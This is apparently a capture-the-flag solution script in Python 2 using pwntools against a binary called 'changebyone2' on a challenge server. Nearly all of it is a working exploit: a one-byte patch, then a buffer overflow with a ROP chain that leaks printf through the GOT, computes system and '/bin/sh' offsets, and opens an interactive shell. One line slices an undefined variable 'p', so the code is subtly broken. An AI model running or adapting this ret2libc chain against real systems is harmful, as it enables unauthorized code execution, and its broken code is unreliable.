from pwn import *

BSS = 0x601050

DEBUG = False

if DEBUG:
    PADDING = ""
    SYSTEM = -0x13990
    BINSH = 0x125365
    r = process("./changebyone2", stderr=2)
else:
    PADDING = "A"*7
    SYSTEM = -0xfd10
    BINSH = 0x112899
    r = remote("challs.thcon.party", 5797)
    print r.recvuntil("[Y/n] :")
    r.sendline("Y")
    print r.recvuntil("offset :")
    r.sendline("0x6f7")
    print r.recvuntil("value :")
    r.sendline("0x00")


p1 = "A"*232
p1 += p64(0x4007a3) # pop rdi; ret
p1 += p64(0x601020) # printf@got
p1 += p64(0x400550) # printf@plt
p1 += p64(0x400676) # main

p1 += PADDING + p64(0x4007a3) * 500
p1 = p[:4095]

r.recvuntil("4096 bytes] : ")
r.sendline(p1)

printf = u64(r.recvn(6) + "\x00"*2)

log.info("printf: %x" % printf)

p2 = "A"*232
p2 += p64(0x4007a3) # pop rdi; ret
p2 += p64(printf + BINSH)
p2 += p64(printf + SYSTEM)

r.sendline(p2)

r.interactive()
